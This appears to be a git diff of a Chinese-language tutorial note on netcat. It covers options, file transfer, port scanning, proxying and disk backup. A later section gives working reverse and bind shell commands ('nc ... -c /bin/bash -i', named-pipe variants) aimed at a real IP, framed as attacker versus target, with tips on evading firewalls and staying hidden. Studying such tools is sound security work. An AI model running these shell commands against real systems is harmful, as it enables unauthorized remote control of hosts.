@@ -1,32 +1,88 @@
-# Linux NetCat
+# Netcat
 
 参考：
 
+https://zhuanlan.zhihu.com/p/83959309
+
 https://program-think.blogspot.com/2019/09/Netcat-Tricks.html
 
-> 不同的netcat版本参数不同
+netcat - TCP/IP  "swiss army knife" .
 
-## 概述
+Common users include：
 
-nc (Netcat)，是一款网络工具，用于主动与套接字建立连接
+-  simple TCP proxies
+- shell-script based HTTP clients and servers
+- network daemon testing
+- a SOCKS or HTTP ProxyCommand for ssh(1)
+- and much, much more
 
- Common uses include:
+nc有很多的变种，有nc.traditional(GNU基础版)，nc.openbsd(openbsd版本)，netcat(nmap版)。不同版本的nc是可以互通。
 
-   ·   simple TCP proxies
-   ·   shell-script based HTTP clients and servers
-   ·   network daemon testing
-   ·   a SOCKS or HTTP ProxyCommand for ssh(1)
-   ·   and much, much more
+```
+root in ~ λ whereis nc
+nc: /bin/nc.openbsd /bin/nc /usr/share/man/man1/nc.1.gz
+root in ~ λ readlink -f $(which nc)
+/bin/nc.openbsd
+```
 
-pattern：`nc [option] destination port`
+我们可以通过`update-alternatives --config nc`来指定默认使用的nc
 
-可以用空格分开多个端口，或是使用短横号
+```
+root in ~ λ update-alternatives --config nc
+There is only one alternative in link group nc (providing /bin/nc): /bin/nc.openbsd
+Nothing to configure.
+```
 
-## 参数
+安装nc.traditional
+
+```
+#安装nc.traditional
+root in /tmp λ  apt -y install netcat/bionic;updatedb
+
+#修改默认使用nc
+root in /tmp λ update-alternatives --query nc
+Name: nc
+Link: /bin/nc
+Slaves:
+ nc.1.gz /usr/share/man/man1/nc.1.gz
+ netcat /bin/netcat
+ netcat.1.gz /usr/share/man/man1/netcat.1.gz
+Status: manual
+Best: /bin/nc.openbsd
+Value: /bin/nc.traditional
+```
+
+## parameter
+
+- `-e`
+
+  nc连接后执行本机的命令，必须以全路径表示
+
+  nc.opensbsd没有改参数，但是可以使用具名管道符来达到此目的。
+
+  ```
+  nc 8.135.0.171 10086 -e '/bin/bash -i'
+  ```
+
+- `-c`
+
+  nc连接后执行本机的命令，可以不用全路径(因为默认使用`/bin/bash -c`)
+
+  nc.opensbsd没有该参数，但是可以使用具名管道符来达到此目的。
+
+  ```
+  nc 8.135.0.171 10086 -c 'bash -i'
+  ```
 
 - `-l`
 
-  指定netcat是监听传入的连接，而不是发起与远程主机的连接。如果没有指定端口，默认随机开启一个端口
+  nc.opensbsd
+
+  表示nc监听，可以直接指定端口表示本地端口。也可以使用`-s`或`-p`指定端口。
+
+  nc.traditional
+
+  ==只表示监听，端口需要使用`-p`或`-s`指定。==
 
 - `-n`
 
@@ -56,191 +112,328 @@ pattern：`nc [option] destination port`
 
   指定代理服务器使用的协议，默认使用SOCKS5
 
-  5代表SOCKS5，4代表SOCKS4，connect代表HTTPS
+  5代表SOCKS5，4代表SOCKS4，connect代表HTTP
+
+  nc.tranditional没有改参数
 
 - `-x proxy_address:[port]`
 
   指定代理使用的地址
 
+  nc.tranditional没有改参数
+
 - `-z`
 
-  一般用于端口扫描，不进行传输层连接
+  一般用于端口扫描，不进行传输层连接。zero io only for scanning
 
 - `-k`
 
-  监听多个连接
+  nc默认如果客户端主动与服务端断开连接(发送SIGINT)，服务端会自动断开。但是可以使用该参数【重复】接收客户端发送的连接。
 
-- `-e`
 
-  有些版本没有`-e`参数，==但是任然可以通过管道符来执行命令，因为nc使用输入流==
+## Example
 
-  ```
-  #server side
-  root in /tmp λ ll  | nc -l 10086
-  
-  #client side
-  root in /opt/test λ nc 8.135.0.171 10086
-  .rw-r--r-- root root 766 B  Thu Jan  7 20:54:22 2021 1
-  .rw-r--r-- root root   3 B  Thu Jan  7 15:19:02 2021 CmsGoAgent.pid
-  |rw-r--r-- root root   0 B  Thu Jan  7 20:48:05 2021 pipe2
-  drwx------ root root   4 KB Thu Jan  7 15:58:03 2021 systemd-private-15d3cb8fbace4e55b6e68bdfecdc488e-apache2.service-4X20kz
-  drwx------ root root   4 KB Thu Jan  7 15:19:02 2021 systemd-private-15d3cb8fbace4e55b6e68bdfecdc488e-chrony.service-OueTdJ
-  drwx------ root root   4 KB Thu Jan  7 15:18:59 2021 systemd-private-15d3cb8fbace4e55b6e68bdfecdc488e-systemd-resolved.service-D22I1S
-  ```
+> server nc.openbsd
+>
+> client nc.traditional
+>
+> 如果出现(UNKNOWN) [8.135.0.171] 10086 (?) : Connection refused
+>
+> 有可能由于nc版本不同，需要通过`-p`参数指定端口
 
-## example
-
-1. 建立两台主机的连接，nc不关心那一台是服务器还是客服端。两端都会显示内容
-
-   ```
-   host1
-   root in ~ λ nc -l 10086
-   
-   echo a
-   echo b
-   cd /etc	
-   pwd
-   echo $SHELL
-   
-   host2
-   root in /etc λ nc 8.135.0.171 10086
-   
-   echo a
-   echo b
-   cd /etc	
-   pwd
-   echo $SHELL  
-   ```
-
-2. 通过nc传输内容，传输完成后会自动关闭连接。==不经过应用层==
-
-   ```
-   #server side
-   root in /opt λ nc -l 10086 >  test.txt #nc将接受到内容写入文件
-   
-   
-   #client side
-   root in /etc λ nc 8.135.0.171 10086 < ~/.ssh/id_rsa.pub 
-   ```
-
-3. 测试端口是否开放
-
-   ```
-   root in /etc λ nc -nvz 8.135.0.171 443 80
-   (UNKNOWN) [8.135.0.171] 443 (https) open
-   (UNKNOWN) [8.135.0.171] 80 (http) open     
-   
-   ```
-
-4. 使用代理服务器
-
-   通过`socks5://10.2.3.4:8080`访问host.example.com的42端口
-
-   ```
-   nc -x 10.2.3.4:8080 -X connect host.example.com 42
-   ```
-
-5. 使用netcat访问网站，这样会发送一条请求指定IP的端口
-
-   ==这样不会暴露浏览器信息，这里必须要有line feed和carriage return==
-
-   ```
-   root in /etc λ echo -e "GET / HTTP/1.0\r\n" | nc -v -w 3 39.156.69.79 80 
-   39.156.69.79: inverse host lookup failed: Unknown host
-   (UNKNOWN) [39.156.69.79] 80 (http) open
-   HTTP/1.1 200 OK
-   Date: Thu, 07 Jan 2021 11:23:17 GMT
-   Server: Apache
-   Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
-   ETag: "51-47cf7e6ee8400"
-   Accept-Ranges: bytes
-   Content-Length: 81
-   Cache-Control: max-age=86400
-   Expires: Fri, 08 Jan 2021 11:23:17 GMT
-   Connection: Close
-   Content-Type: text/html
-   
-   <html>
-   <meta http-equiv="refresh" content="0;url=http://www.baidu.com/">
-   ```
-
-   ```
-   C:\Users\82341>echo -e "GET / HTTP1.0\r\n" | ncat  baid.com 80
-   HTTP/1.1 400 Bad Request
-   Server: nginx/1.10.3 (Ubuntu)
-   Date: Sat, 06 Feb 2021 08:22:47 GMT
-   Content-Type: text/html
-   Content-Length: 182
-   Connection: close
-   
-   <html>
-   <head><title>400 Bad Request</title></head>
-   <body bgcolor="white">
-   <center><h1>400 Bad Request</h1></center>
-   <hr><center>nginx/1.10.3 (Ubuntu)</center>
-   </body>
-   </html>
-   ```
-
-   
-
-6. 使用nc备份整个磁盘
-
-   ```
-   recv  接收端
-   nc -l -p xxx | dd of=/dev/sdb
-   
-   send 发送端
-   dd if=/dev/sda | nc x.x.x.x xxx 
-   ```
-
-7. 远程使用命令
-
-   使用这种方式会在服务端显示交互的shell，不具备隐蔽性
-
-   ```
-   #server side
-   root in /tmp λ nc -l 10086 | /bin/bash -i 2&>1
-   123
-   
-   #client side
-   root in /usr/local/\ λ nc 8.135.0.171 10086
-   echo 123
-   ```
-
-## 被动连接
-
-==远程执行命令==，所有服务端的内容将在客户端显示。这种方式能被防火墙拦截
+### file transfer
 
 ```
-server side 服务端
-root in /tmp λ mkfifo /tmp/pipe2
-root in /tmp λ cat /tmp/pipe2 | /bin/bash -i 2&>1  | nc -l 10086 > /tmp/pipe2 
-#第一次执行空内容这里表示nc server 接受nc client 输入的内容写入到具名管道符pipe2，然后从pipe2中读取内容执行
+#server
+root in ~ λ nc -l -p 10086 >| ddos
 
-
-client side 客户端
-root in /opt/test λ nc 8.135.0.171 10086
+#client
+root in /usr/local/\/go_ddos/DDoS on master λ nc 8.135.0.171 10086 < ddos.go
 ```
 
-## 主动连接
-
-与被动连接类似，唯一的差别在于把客户端与服务端对调。也就是所攻击者的nc充当服务器，受害者的nc充当客户端。受害者的nc无需开启监听端口，==所以不受防火墙和NAT的影响==
+### port scanning
 
 ```
-#client side
-nc -lk -p xxx
-
-#server side
-/bin/bash -i 2 &> 1 | nc x.x.x.x xxx
+root in /usr/local/\/go_ddos/DDoS on master λ nc -nvvz 8.135.0.171  80 443 22 10-100
+(UNKNOWN) [8.135.0.171] 80 (http) open
+(UNKNOWN) [8.135.0.171] 443 (https) open
+(UNKNOWN) [8.135.0.171] 22 (ssh) open
 ```
 
-## 被动连接VS主动连接
+### request
 
-**被动连接**
+可以隐藏浏览器信息
 
-由于绝大数PC都处于内网（未分配公网IP）。攻击者需要与受害者在同一局域网，才能建立通信。服务端需要显示开启监听端口，很容易引起用户怀疑。
+```
+root in ~ λ  echo -e "GET / HTTP/1.0\r\n"  | nc baidu.com 80
+HTTP/1.1 200 OK
+Date: Fri, 26 Feb 2021 05:47:17 GMT
+Server: Apache
+Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
+ETag: "51-47cf7e6ee8400"
+Accept-Ranges: bytes
+Content-Length: 81
+Cache-Control: max-age=86400
+Expires: Sat, 27 Feb 2021 05:47:17 GMT
+Connection: Close
+Content-Type: text/html
 
-**主动连接**
+<html>
+<meta http-equiv="refresh" content="0;url=http://www.baidu.com/">
+</html>
+```
 
-主动连接，没有这种种弊端
+### throughput
+
+nc还可以用于测试网络的吞吐量
+
+```
+#server
+root in /tmp λ nc -lvv -p 10086 >/dev/null
+listening on [any] 10086 ...
+115.197.191.90: inverse host lookup failed: Unknown host
+connect to [172.19.124.44] from (UNKNOWN) [115.197.191.90] 1220
+ sent 0, rcvd 8608400
+
+#client
+root in /etc/apt λ time nc 8.135.0.171 10086 < /dev/zero
+^C
+nc 8.135.0.171 10086 < /dev/zero  0.00s user 0.01s system 0% cpu 4.921 total
+```
+
+### backup 
+
+```
+#recv  
+nc -l -p xxx| dd of=/dev/sdb
+
+#send 
+dd if=/dev/sda | nc x.x.x.x xxx 
+```
+
+### proxy
+
+nc会通过5566端口访问baidu的80端口，由于管道符的单向性只会将内容显示在proxy(代理端)
+
+```
+#proxy
+root in /opt λ nc -lk -p 5566 | nc baidu.com 80
+
+#client
+root in /opt λ echo -e "GET / HTTP/1.0\r\n" | nc localhost 5566 
+
+----
+#tcpdump
+root in /usr/local/\/go_ddos λ tcpdump -i eth0 -vv host baidu.com
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+15:36:57.958760 IP (tos 0x0, ttl 64, id 63109, offset 0, flags [DF], proto TCP (6), length 57)
+    192.168.80.200.44276 > 220.181.38.148.http: Flags [P.], cksum 0x14e6 (incorrect -> 0xa59e), seq 3534764453:3534764470, ack 389173517, win 64239, length 17: HTTP, length: 17
+	GET / HTTP/1.0
+	
+15:36:57.958887 IP (tos 0x0, ttl 128, id 65511, offset 0, flags [none], proto TCP (6), length 40)
+    220.181.38.148.http > 192.168.80.200.44276: Flags [.], cksum 0x7e60 (correct), seq 1, ack 17, win 64206, length 0
+    
+----
+#proxy
+root in ~ λ nc -l -p 5566 | nc baidu.com 80
+HTTP/1.1 200 OK
+Date: Sun, 28 Feb 2021 04:56:29 GMT
+Server: Apache
+Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
+ETag: "51-47cf7e6ee8400"
+Accept-Ranges: bytes
+Content-Length: 81
+Cache-Control: max-age=86400
+Expires: Mon, 01 Mar 2021 04:56:29 GMT
+Connection: Close
+Content-Type: text/html
+
+<html>
+<meta http-equiv="refresh" content="0;url=http://www.baidu.com/">
+</html>
+```
+
+==可以使用named pipe具名管道符将请求的内容显示在被代理端==。具名管道符可以解决匿名管道符单向性和进程交互的问题(类似于高级编程语言中的channel)。
+
+```
+#proxy，使用管道符就是为了保证io通道不断开，这里nc server会将内容同步给nc client
+root in /tmp λ if test -p pipe ;then :; else mkfifo piep;fi
+root in /tmp λ nc -l -p 10086 < pipe | nc baidu.com 80 > pipe
+等价
+root in /tmp λ cat pipe | nc -l -p 10086 | nc baidu.com 80 > pipe
+
+#client
+root in ~ λ echo -e "GET / HTTP/1.0\r\n" |  nc  localhost 10086
+HTTP/1.1 200 OK
+Date: Sun, 28 Feb 2021 05:03:39 GMT
+Server: Apache
+Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
+ETag: "51-47cf7e6ee8400"
+Accept-Ranges: bytes
+Content-Length: 81
+Cache-Control: max-age=86400
+Expires: Mon, 01 Mar 2021 05:03:39 GMT
+Connection: Close
+Content-Type: text/html
+
+<html>
+<meta http-equiv="refresh" content="0;url=http://www.baidu.com/">
+</html>
+```
+
+flowchart
+
+```mermaid
+graph TD
+a(nc client) --> b(nc server) --> c(nc baidu resp) --> d(pipe) -->|只会讲内容发送给nc client 不会发送给匿名管道符| a
+```
+
+
+
+
+
+如果使用的是nc.openbsd还可以使用`-X`和`-x`参数
+
+```
+root in ~ λ echo -e "GET / HTTP/1.0/r/n" | nc -X connect -x 107.23.228.234:3128 -v baidu.com 443
+Connection to baidu.com 443 port [tcp/https] succeeded!
+HTTP/1.1 302 Moved Temporarily
+Server: bfe/1.0.8.18
+Date: Sun, 28 Feb 2021 07:54:02 GMT
+Content-Type: text/html
+Content-Length: 161
+Connection: close
+Location: http://www.baidu.com/error.html
+
+<html>
+<head><title>302 Found</title></head>
+<body bgcolor="white">
+<center><h1>302 Found</h1></center>
+<hr><center>bfe/1.0.8.18</center>
+</body>
+</html>
+```
+
+### reverse shell
+
+> 可以结合nohup 和 coproc 进一步增加隐蔽性和可用性
+
+**positive / attacker主动建立连接**
+
+这种方式会受target的防火墙的影响(防火墙可以配置禁止对外监听端口)。同时因为在建立TCP连接前target会一直监听，也会增加reverse shell暴露的风险。
+
+```
+#target，target将自己的shell反弹给attacker
+root in ~ λ nc -l -p 10086 -c '/bin/bash -i 2>&1'
+
+#attacker，主动建立连接
+root in /etc/apt λ nc 8.135.0.171 10086
+
+#attacker
+root in /etc/apt λ nc 8.135.0.171 10086                       
+root@ubuntu18:~# pwd
+pwd
+/root
+root@ubuntu18:~# 
+
+```
+
+没有建立ESTABLISHED连接之前，可以在监听的端口中查看到
+
+```
+root in ~ λ ss -ltp | grep 10086
+LISTEN   0         1                   0.0.0.0:10086             0.0.0.0:*       users:(("nc",pid=10880,fd=3))
+```
+
+**passive / attacker被动建立连接**
+
+attacker和target可以互换，让attacker充当nc服务端。这种方式的优点是，target无需显示的开启监听，==不受防火墙和NAT的影响。==
+
+```
+#attacker，被动建立连接
+root in ~ λ nc -lk -p 10086
+
+#target，将自己的shell反弹给attacker
+root in /tmp λ nc 8.135.0.171 10086 -c '/bin/bash -i 2>&1'
+
+#attacker
+
+Sun 28 Feb 2021 01:22:31 PM CST
+
+ ┌─────(6 root)─────(/tmp)
+ └> $ pwd
+pwd
+/tmp
+
+```
+
+这种方式target不监听，但是可以在ESTABLISHED中查看，增加了reverse shell隐蔽性。
+
+```
+root in /etc/apt λ ss -ltp   
+State           Recv-Q          Send-Q                   Local Address:Port                          Peer Address:Port          Process                                      
+LISTEN          0               128                            0.0.0.0:ssh                                0.0.0.0:*              users:(("sshd",pid=1102,fd=3))              
+LISTEN          0               244                          127.0.0.1:postgresql                         0.0.0.0:*              users:(("postgres",pid=1368,fd=4))          
+LISTEN          0               80                           127.0.0.1:mysql                              0.0.0.0:*              users:(("mysqld",pid=1319,fd=20))           
+LISTEN          0               128                               [::]:ssh                                   [::]:*              users:(("sshd",pid=1102,fd=4))              
+LISTEN          0               244                              [::1]:postgresql                            [::]:*              users:(("postgres",pid=1368,fd=3))          
+LISTEN          0               511                                  *:http                                     *:*              users:(("apache2",pid=6759,fd=4),("apache2",pid=6758,fd=4),("apache2",pid=6757,fd=4),("apache2",pid=6756,fd=4),("apache2",pid=6755,fd=4),("apache2",pid=1504,fd=4))
+
+root in /etc/apt λ ss -tp | grep 10086
+ESTAB 0      0      192.168.80.200:46410  8.135.0.171:10086 users:(("bash",pid=7504,fd=2),("bash",pid=7504,fd=1),("bash",pid=7504,fd=0),("sh",pid=7503,fd=2),("sh",pid=7503,fd=1),("sh",pid=7503,fd=0))
+```
+
+==由于nc.openbsd没有`-e`或`-c`参数所以需要使用具名管道符。来实现reverse shell==
+
+```
+#server，只会将结果发送给pipe或是nc client两者之一
+#第一次先将bash prompt发送给nc client
+#随后收到nc client的命令传给pipe，bash读取pipe内容执行返回给nc client
+root in /tmp λ cat pipe | bash -i 2>&1 | nc -l -p 10086 > pipe
+#等价
+root in /tmp λ bash -i 2>&1 < pipe | nc -l -p 10086 > pipe
+
+#client
+root in ~ λ nc 8.135.0.171 10086
+root@ubuntu18:/tmp# ls
+ls
+AliyunAssistClientSingleLock.lock
+bash
+CmsGoAgent.pid
+_MEIM3fcpz
+pipe
+systemd-private-e8db9b6344cd44dab469a9dc4418af69-apache2.service-uCdsZV
+systemd-private-e8db9b6344cd44dab469a9dc4418af69-chrony.service-SvSjRc
+systemd-private-e8db9b6344cd44dab469a9dc4418af69-systemd-resolved.service-qO23qK
+root@ubuntu18:/tmp# 
+```
+
+测试，只会发送给pipe或nc client两者之一
+
+```
+#server
+root in /tmp λ ls | nc -l -p 10086 > pipe
+root in /tmp λ cat pipe
+
+#client
+root in /etc/apt λ nc 8.135.0.171 10086
+AliyunAssistClientSingleLock.lock
+CmsGoAgent.pid
+pipe
+pp
+systemd-private-ec12ca395b2146af94778c470c5409e3-apache2.service-cl58WH
+systemd-private-ec12ca395b2146af94778c470c5409e3-chrony.service-FKTalK
+systemd-private-ec12ca395b2146af94778c470c5409e3-systemd-resolved.service-Vvvc0
+```
+
+flowchart
+
+```mermaid
+graph TD
+a(pipe) --> b(bash) --> c(nc client) --> a
+```
+
+
+
+
+
